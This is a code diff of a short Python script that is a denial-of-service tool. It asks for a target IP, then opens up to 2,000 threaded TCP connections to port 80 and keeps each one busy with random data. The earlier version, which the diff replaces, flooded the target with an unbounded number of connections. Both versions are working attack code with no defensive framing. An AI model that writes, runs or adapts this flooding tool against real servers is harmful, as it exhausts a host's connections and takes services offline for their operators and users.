@@ -1,28 +1,33 @@
 import socket
 import random
 import threading
+import time
 
-class Client:
+class SlowL:
 	def __init__(self, ip, port):
-		self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		self.sock.connect((ip, port))
-		iThread = threading.Thread(target=self.handler)
-		iThread.daemon = True
-		iThread.start()
+		self.ip = ip
+		self.port = port
+		self.open = 0
+		while True:
+			if self.open < 2000:
+				t = threading.Thread(target=self.handler)
+				t.daemon = True
+				t.start()
+				self.open += 1
+			print("Open count: " + str(self.open) + " - " + "Active thread count: " + str(threading.active_count()))
 
 	def handler(self):
+		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		sock.connect((self.ip, self.port))
 		while True:
 			try:
-				self.sock.send(bytes(str(random.randint(1000000000, 99999999999)), "utf-8"))
+				sock.send(bytes(str(random.randint(1000000000, 99999999999)), "utf-8"))
+				sock.recv(1024)
 			except:
-				loof.append(Client(ipthing, 80))
-				pass
+				sock.close()
+				break
+		self.open -= 1
 
 if __name__ == '__main__':
-	global ipthing
-	global loof
-	ipthing = input("IP PLES: ")
-	loof = []
-	while True:
-		loof.append(Client(ipthing, 80))
-		print("Client Added")
+	ips = input("IP NOW: ")
+	s = SlowL(ips, 80)
